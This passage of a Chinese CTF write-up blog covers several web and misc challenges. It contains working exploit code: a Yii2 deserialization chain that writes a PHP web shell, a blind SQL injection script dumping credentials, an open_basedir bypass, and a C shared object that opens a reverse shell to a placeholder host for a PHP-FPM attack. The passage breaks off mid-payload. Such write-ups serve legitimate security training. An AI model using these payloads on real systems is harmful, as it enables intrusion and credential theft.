class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 因此这部分只需要如此构造即可写入 shell。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Yii</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">CreateAction</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&quot;file_put_contents(\&quot;php://filter/write=convert.base64-decode/resource=shell.php\&quot;,\&quot;PD9waHAgZXZhbCgkX0dFVFsiaDN4Il0pOyBwaHBpbmZvKCk7ID8+\&quot;)&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来只需要找一个构造一个可以触发到上述方法的类即可，很容易找到 <code>vendor/fzaninotto/faker/src/Faker/Generator.php</code> 下的 <code>format()</code> 方法中含有一个 <code>call_user_func_array($this-&gt;getFormatter($formatter), $arguments)</code>，而 <code>format()</code> 方法可以由 <code>__call</code> 触发到，因此只需要找一个对其调用不存在方法的类即可。这部分可以如此构造。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&quot;run&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <code>vendor/yiisoft/yii2/db/BatchQueryResult.php</code> 下可以找到 <code>__destruct()</code> 调用到了类中的 <code>reset()</code> 方法，而其中包含了对可控参数 <code>$this-&gt;_dataReader</code> 的 <code>close()</code> 方法的调用。因此构造出如下代码来满足利用条件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只需要将上述代码合起来并生成载荷即可写入 shell。访问 shell 可以在 phpinfo 中找到如下 disable_functions。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl,mail,putenv,error_log,error_reporting,unset,unlink,return</span><br></pre></td></tr></table></figure><p>后续的步骤可以上传一个 lua 脚本来读取 flag。这里摘录一下 <a href="https://harvey.plus/">@Harvey</a> 师傅的 lua 脚本。</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span> <span class="string">&quot;string&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--[[</span></span><br><span class="line"><span class="comment">     This is the default method name for Lua handlers, see the optional</span></span><br><span class="line"><span class="comment">     function-name in the LuaMapHandler directive to choose a different</span></span><br><span class="line"><span class="comment">     entry point.</span></span><br><span class="line"><span class="comment">--]]</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handle</span><span class="params">(r)</span></span></span><br><span class="line">    r.content_type = <span class="string">&quot;text/plain&quot;</span></span><br><span class="line">    r:puts(<span class="string">&quot;Hello Lua World!\n&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> t = <span class="built_in">io</span>.<span class="built_in">popen</span>(<span class="string">&#x27;/readflag&#x27;</span>)</span><br><span class="line">    <span class="keyword">local</span> a = t:<span class="built_in">read</span>(<span class="string">&quot;*all&quot;</span>)</span><br><span class="line">    r:puts(a)</span><br><span class="line">    <span class="keyword">if</span> r.method == <span class="string">&#x27;GET&#x27;</span> <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> <span class="built_in">pairs</span>( r:parseargs() ) <span class="keyword">do</span></span><br><span class="line">            r:puts( <span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;%s: %s\n&quot;</span>, k, v) )</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        r:puts(<span class="string">&quot;Unsupported HTTP method &quot;</span> .. r.method)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>只需要再写入 .htaccess 使上传的 lua 脚本得以执行即可得到 flag。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler lua-script .lua</span><br></pre></td></tr></table></figure><h3 id="WebsiteManger"><a href="#WebsiteManger" class="headerlink" title="WebsiteManger"></a>WebsiteManger</h3><p><code>image.php</code> 的 GET 参数 id 存在 SQL 注入点，逻辑是 <code>/image.php?id=null/**/or(1=0)#</code>，尝试使用盲注来获取信息。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlencode</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://HOST/image.php&quot;</span></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    text = <span class="string">&quot;&quot;</span></span><br><span class="line">    keywords = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">126</span></span><br><span class="line">        <span class="keyword">while</span> low &lt;= high:</span><br><span class="line">            mid = <span class="built_in">int</span>((low + high) / <span class="number">2</span>)</span><br><span class="line">            <span class="comment"># sql = f&quot;null/**/or(ascii(substr((select/**/group_concat(table_name)from(information_schema.tables)/**/where/**/table_schema=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;)#&quot;  # images,users</span></span><br><span class="line">            <span class="comment"># sql = f&quot;null/**/or(ascii(substr((select/**/group_concat(column_name)from(information_schema.columns)/**/where/**/table_schema=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;)#&quot;  # id,path,username,password</span></span><br><span class="line">            sql = <span class="string">f&quot;null/**/or(ascii(substr((select/**/group_concat(username,&#x27;:&#x27;,password)from(users)),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>)#&quot;</span>  <span class="comment"># admin:c6caf56650e4f2915da6c</span></span><br><span class="line">            payload = <span class="string">f&quot;?id=&quot;</span> + sql</span><br><span class="line">            r = session.get(url + payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(r.content) != <span class="number">50811</span>:</span><br><span class="line">                high = mid - <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">126</span>:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        mid_num = <span class="built_in">int</span>((high + low + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">        text += <span class="built_in">chr</span>(mid_num)</span><br><span class="line">        <span class="built_in">print</span>(text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>登录上去之后直接提交 <code>file:///flag</code> 进行 SSRF，即可得到如下回显。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0fc00d3d-b304-46b8-98d0-34dd512d658b/1620572577955/20f2af3dc79a6d1fc1aa72942873ee5fb6627b97.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f56d321d-50d8-4d4e-816e-621ce8c89806&#125;</span><br></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>010 editor 打开附件，使用 EBCDIC 的编辑方式即可看到 flag。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0fc00d3d-b304-46b8-98d0-34dd512d658b/1621149525356/86d9609c8a25236439160579bb767ed990ea9619.png"></p><h3 id="colorful-code"><a href="#colorful-code" class="headerlink" title="colorful code"></a>colorful code</h3><p>以附件中的 data1 的内容为像素点，以 data2 的内容为像素点所在位置，编写脚本将图片画出来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">data1 = <span class="built_in">open</span>(<span class="string">&quot;data1&quot;</span>, <span class="string">&quot;r&quot;</span>).read().split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">data2 = <span class="built_in">open</span>(<span class="string">&quot;data2&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"></span><br><span class="line">pixels = [(data2[x], data2[x + <span class="number">1</span>], data2[x + <span class="number">2</span>]) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data2) // <span class="number">3</span>, <span class="number">3</span>)]</span><br><span class="line">pixelsInOrder = [pixels[<span class="built_in">int</span>(x)] <span class="keyword">for</span> x <span class="keyword">in</span> data1[:-<span class="number">1</span>]]</span><br><span class="line">image = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (<span class="number">37</span>, <span class="number">191</span>), <span class="string">&quot;white&quot;</span>)</span><br><span class="line">[image.putpixel((y, x), pixelsInOrder[x + y * <span class="number">191</span>]) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">191</span>) <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">37</span>)]</span><br><span class="line"></span><br><span class="line">image.save(<span class="string">&quot;this.png&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0fc00d3d-b304-46b8-98d0-34dd512d658b/1620581893491/991f7765293e9751a982658c01d8eceb30b0bc56.png"></p><p>使用 npiet 执行上图并将得到的输出包上 flag 格式可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;88842f20-fb8c-45c9-ae8f-36135b6a0f11&#125;</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>https://lemonprefect.cn/zh-CN/posts/938f6c40.html#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>蓝帽杯 2021</title>
      <link>https://lemonprefect.cn/zh-CN/posts/e43fbefd.html</link>
      <guid>https://lemonprefect.cn/zh-CN/posts/e43fbefd.html</guid>
      <pubDate>Fri, 07 May 2021 10:07:00 GMT</pubDate>
      
        
        
          
          
      <description>&lt;h2 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h2&gt;&lt;h3 id=&quot;Ball-sigin&quot;&gt;&lt;a href=&quot;#Ball-sigin&quot; class=&quot;headerlink&quot; title=&quot;Ball_sigin&quot;&gt;&lt;/a&gt;Ball_sigin&lt;/h3&gt;&lt;p&gt;egret 引擎开发的小游戏，主要的代码都在 Games.js 中。主要的玩法是操作小球滑动躲避树并收集对应左上角单词缺失的字母。将 Games.js 下载下来后格式化，可以发现在&lt;code&gt;hitWordLetter()&lt;/code&gt;</description>
          
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Ball-sigin"><a href="#Ball-sigin" class="headerlink" title="Ball_sigin"></a>Ball_sigin</h3><p>egret 引擎开发的小游戏，主要的代码都在 Games.js 中。主要的玩法是操作小球滑动躲避树并收集对应左上角单词缺失的字母。将 Games.js 下载下来后格式化，可以发现在<code>hitWordLetter()</code> 方法下有如下逻辑。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>._score === <span class="number">60</span>) &#123;</span><br><span class="line"><span class="built_in">this</span>.gameOverFunc();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是只要分数达到六十分即可获胜，定位到 <code>gameOverFunc()</code> 可以发现获胜结果是通过向 <code>/testData</code> 发送 POST 请求从服务端获取的，其中提交的数据结构如下。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> datas = &#123;</span><br><span class="line"><span class="string">&#x27;balls&#x27;</span>: <span class="built_in">this</span>._balls,</span><br><span class="line"><span class="string">&#x27;trees&#x27;</span>: <span class="built_in">this</span>._trees,</span><br><span class="line"><span class="string">&#x27;words&#x27;</span>: <span class="built_in">this</span>._words,</span><br><span class="line"><span class="string">&#x27;infos&#x27;</span>: <span class="built_in">this</span>._infos</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>将 <code>gameOverFunc()</code> 处的判断改一下，使其无论分数多少都提交数据，从而得到如下提交样例。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/7f363bdc-676b-4e98-b8ef-59cfda4fd170/1619697838325/4f1b9e467ccf84e6a2b596cef2bfc5c88fb973d1.png"></p><p>可以发现树的位置和单词的位置以及小球的位置都会被实时记录，因此想要手动伪造一份记录十分困难。定位到 <code>addBarriers()</code> 方法可以发现树的坐标是随机生成的，因此可以稍作修改使树排排站。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">treeBg.x = <span class="number">1</span>;</span><br><span class="line">treeBg.y = <span class="built_in">Math</span>.random() * (<span class="built_in">this</span>._stageH - <span class="number">80</span> - (<span class="built_in">this</span>._isFitstApperar ? <span class="number">500</span> : <span class="number">0</span>)) + (<span class="built_in">this</span>._isFitstApperar ? <span class="number">500</span> : <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>使用 Fiddler 拦截请求来替换 Games.js，即可轻松完成游戏设定的目标。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/7f363bdc-676b-4e98-b8ef-59cfda4fd170/1619697410922/9a61625f26a8fcbfcfd85c5661c44861ce5d0534.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f2852395-1f2b-47a6-bd29-cd54bb67a614&#125;</span><br></pre></td></tr></table></figure><h3 id="one-Pointer-php"><a href="#one-Pointer-php" class="headerlink" title="one_Pointer_php"></a>one_Pointer_php</h3><blockquote><p>how to change my euid？</p></blockquote><h4 id="PHP-INT-MAX-导致赋值报错"><a href="#PHP-INT-MAX-导致赋值报错" class="headerlink" title="PHP_INT_MAX 导致赋值报错"></a>PHP_INT_MAX 导致赋值报错</h4><p>下载题目给出的附件，可以得到如下代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>=unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line"><span class="variable">$count</span>[++<span class="variable">$user</span>-&gt;count]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$count</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line"><span class="variable">$user</span>-&gt;count+=<span class="number">1</span>;</span><br><span class="line">setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$user</span>=<span class="keyword">new</span> User;</span><br><span class="line"><span class="variable">$user</span>-&gt;count=<span class="number">1</span>;</span><br><span class="line">setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$count</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>很容易发现判断的语句是一个赋值语句，因此需要尝试让赋值语句返回 <code>false</code>。恰巧赋值的是一个数组，当数组的下标达到 <code>PHP_INT_MAX</code> 即 9223372036854775807 时再次使用 <code>$count[]=1</code> 增加新的数组元素时即会失败。因此只要让 <code>$count</code> 的值为 <code>PHP_INT_MAX</code> 即可，构造出如下序列化脚本。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$count</span> = PHP_INT_MAX - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> User);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行脚本得到了如下载荷。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;count&quot;</span>;i:<span class="number">9223372036854775806</span>;&#125;</span><br></pre></td></tr></table></figure><p>将载荷拼接到 <code>$_COOKIE[&quot;data&quot;]</code> 中即可到达 <code>eval($_GET[&quot;backdoor&quot;]);</code>，从而执行一部分指令。执行 <code>phpinfo()</code> 可以发现靶机所使用的是 PHP 7.4.16，且有如下 disable_functions 和 disable_classes。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stream_socket_client,fsockopen,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive</span><br><span class="line"></span><br><span class="line">Exception,SplDoublyLinkedList,Error,ErrorException,ArgumentCountError,ArithmeticError,AssertionError,DivisionByZeroError,CompileError,ParseError,TypeError,ValueError,UnhandledMatchError,ClosedGeneratorException,LogicException,BadFunctionCallException,BadMethodCallException,DomainException,InvalidArgumentException,LengthException,OutOfRangeException,PharException,ReflectionException,RuntimeException,OutOfBoundsException,OverflowException,PDOException,RangeException,UnderflowException,UnexpectedValueException,JsonException,SodiumException</span><br></pre></td></tr></table></figure><h4 id="FTP-SSRF-攻击-PHP-FPM-FastCGI"><a href="#FTP-SSRF-攻击-PHP-FPM-FastCGI" class="headerlink" title="FTP SSRF 攻击 PHP-FPM/FastCGI"></a>FTP SSRF 攻击 PHP-FPM/FastCGI</h4><blockquote><p><a href="https://whoamianony.top/2021/05/02/Web%E5%AE%89%E5%85%A8/%E6%B5%85%E5%85%A5%E6%B7%B1%E5%87%BA%20Fastcgi%20%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E4%B8%8E%20PHP-FPM%20%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/">https://whoamianony.top/2021/05/02/Web%E5%AE%89%E5%85%A8/%E6%B5%85%E5%85%A5%E6%B7%B1%E5%87%BA%20Fastcgi%20%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E4%B8%8E%20PHP-FPM%20%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/</a></p></blockquote><p>在 phpinfo 中可以发现设置了 open_basedir，因此稍微用 <code>chdir()</code> 与 <code>ini_set()</code> 组合来绕过一下可以得到如下载荷来读到 nginx 的配置文件，从而可以得到 FastCGI 的端口。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?backdoor&#x3D;mkdir(%27h3x%27);chdir(%27h3x%27);ini_set(%27open_basedir%27,%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%27&#x2F;%27);echo file_get_contents(&#39;&#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;default&#39;);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># pass PHP scripts to FastCGI server</span><br><span class="line">#</span><br><span class="line">location ~ \.php$ &#123;</span><br><span class="line">    root           html;</span><br><span class="line">    fastcgi_pass   127.0.0.1:9001;</span><br><span class="line">    fastcgi_index  index.php;</span><br><span class="line">    fastcgi_param  SCRIPT_FILENAME  &#x2F;var&#x2F;www&#x2F;html&#x2F;$fastcgi_script_name;</span><br><span class="line">    include        fastcgi_params;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>使用如下代码编译出反弹 shell 的恶意 so 文件。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/YOUR_HOST/3255 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hpdoger.c -fPIC -shared -o hpdoger.so</span><br></pre></td></tr></table></figure><p>拼接使用如下的载荷将编译好的文件上传到靶机。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy(<span 